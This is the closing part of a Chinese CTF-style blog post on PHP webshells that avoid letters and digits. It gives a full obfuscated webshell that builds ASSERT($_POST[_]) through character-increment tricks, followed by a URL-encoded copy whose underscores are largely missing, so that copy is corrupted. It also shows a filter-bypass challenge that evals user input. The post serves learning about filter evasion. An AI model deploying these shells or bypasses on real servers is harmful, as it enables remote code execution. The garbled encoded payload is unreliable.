+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-97-1024x543.png"></p>
+<h3 id="五、方法三"><a href="#五、方法三" class="headerlink" title="五、方法三"></a>五、方法三</h3><p>方法二是使用了位运算，方法三是不再使用位运算来搞定这个题目的，完全阐释了这两张图啊，大佬才能想出来的东西，我直接好家伙……</p>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-98.png"><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-99.png"><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-100-1024x543.png"></p>
+<p>说了这么多，其实就是<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>,<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>，所以我们只要拿到一个变量就可以得到所以的变量了</p>
+<p>这时候大佬又正好了，而我是直接放弃了……数组中可以得到大小写a，就相当于我们拿到了所有的字母</p>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-101-1024x119.png"></p>
+<p>利用这个技巧，我们就可以编写如下的webshell了</p>
+<pre><code>&lt;?phphighlight_file(__FILE__);$_=[];$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];$___=$_; // A$__=$_;// 因为A和S相差18，所以要$__++十八次，下面也是相同的道理$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);
+</code></pre>
+<p>php对大小写不敏感，所以使用<code>ASSERT($_POST[_]);</code>也是可以的，运行结果如下：</p>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-154-1024x539.png"></p>
+<p>绕过也是成功的：</p>
+<p>老规矩，还是得进行url编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%24%3D%5B%5D%3B%24%3D%40%22%24%22%3B%24%3D%24%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%24___%3D%24%3B%24%3D%24_%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24_.%3D%24%3B%24_.%3D%24%3B%24%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24_.%3D%24%3B%24__%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24_.%3D%24%3B%24%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24_.%3D%24%3B%24__%3D&#x27;</span><br><span class="line">_&#x27;%3B%24__</span><br><span class="line">%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24_.%3D%24%3B%24%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24.%3D%24%3B%24%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24.%3D%24%3B%24%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24_.%3D%24__%3B%24%3D%24%24%3B%24__(%24%5B_%5D)%3B</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-156-1024x541.png"></p>
+<blockquote>
+<p>经过测试发现：对PHP版本有限制（这只是个人测试的，不代表最终效果）</p>
+<p>5.4.45&lt;&#x3D;PHP&lt;&#x3D;7.0.9</p>
+</blockquote>
+<h1 id="提高篇"><a href="#提高篇" class="headerlink" title="提高篇"></a>提高篇</h1><blockquote>
+<p>源码：</p>
+</blockquote>
+<pre><code>&lt;?php
+if (isset($_GET[&#39;code&#39;])) &#123;
+    $code = $_GET[&#39;code&#39;];
+    if (strlen($code) &gt; 35) &#123;
+        die(&quot;Long.&quot;);
+    &#125;
+    if (preg_match(&quot;/[A-Za-z0-9_$]+/&quot;, $code)) &#123;
+        die(&quot;NO.&quot;);
+    &#125;
+    eval($code);
+&#125; else &#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<h3 id="PHP7下绕过"><a href="#PHP7下绕过" class="headerlink" title="PHP7下绕过"></a>PHP7下绕过</h3><p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。所以我们构造一个phpinfo字符串即可。</p>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-176-1024x459.png"></p>
+<h3 id="PHP5下绕过"><a href="#PHP5下绕过" class="headerlink" title="PHP5下绕过"></a>PHP5下绕过</h3><p>看的有点懵逼，有时间再看看，有兴趣的小伙伴可以去P神的原文看看，文章的顶部有链接，是我太菜了……</p>
+<p>再次感谢大佬的文章！</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>monkey111
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://monkeyx1.github.io/2022/10/18/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/" title="不包含字母和数字的webshell">https://monkeyx1.github.io/2022/10/18/不包含字母和数字的webshell/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+                    
+                      <a href="/" rel="tag"><i class="fa fa-tag"></i> </a>
+                    
+                      <a href="/" rel="tag"><i class="fa fa-tag"></i> </a>
+                    
+                      <a href="/" rel="tag"><i class="fa fa-tag"></i> </a>
+                    
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/10/14/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/" rel="prev" title="NewStarCTF 公开赛赛道 WEEK3 WP">
+                  <i class="fa fa-chevron-left"></i> NewStarCTF 公开赛赛道 WEEK3 WP
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/10/21/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/" rel="next" title="NewStarCTF 公开赛赛道 WEEK4 WP">
+                  NewStarCTF 公开赛赛道 WEEK4 WP <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">monkey111</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">180k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:44</span>
+  </span>
+</div><div>
+  <span id="sitetime"></span>
+  <script language=javascript>
+      function siteTime(){
+          window.setTimeout("siteTime()", 1000);
+          var seconds = 1000;
+          var minutes = seconds * 60;
+          var hours = minutes * 60;
+          var days = hours * 24;
+          var years = days * 365;
+          var today = new Date();
+          var todayYear = today.getFullYear();
+          var todayMonth = today.getMonth()+1;
+          var todayDate = today.getDate();
+          var todayHour = today.getHours();
+          var todayMinute = today.getMinutes();
+          var todaySecond = today.getSeconds();
+          /* 
+          Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+          year - 作为date对象的年份，为4位年份值
+          month - 0-11之间的整数，做为date对象的月份
+          day - 1-31之间的整数，做为date对象的天数
+          hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+          minutes - 0-59之间的整数，做为date对象的分钟数
+          seconds - 0-59之间的整数，做为date对象的秒数
+          microseconds - 0-999之间的整数，做为date对象的毫秒数
+      */
+          var t1 = Date.UTC(2021,12,23,11,40,00); //北京时间2018-2-13 00:00:00
+          var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+          var diff = t2-t1;
+      var diffYears = Math.floor(diff/years);
+      var diffDays = Math.floor((diff/days)-diffYears*365);
+      var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+      var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+      var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+      document.getElementById("sitetime").innerHTML=" 已运行"+/*diffYears+" 年 "+*/diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+    }
+      siteTime();
+  </script>
+</div>
+
+    </div>
+  </footer>
+
+  
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"ccA2VsTMA0zc7SQqWsCEBhP6-gzGzoHsz","app_key":"RzrgPNrOtq5LckltkJZDwE0z","server_url":null,"security":true}</script>
+  <script src="/js/third-party/statistics/lean-analytics.js"></script>
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
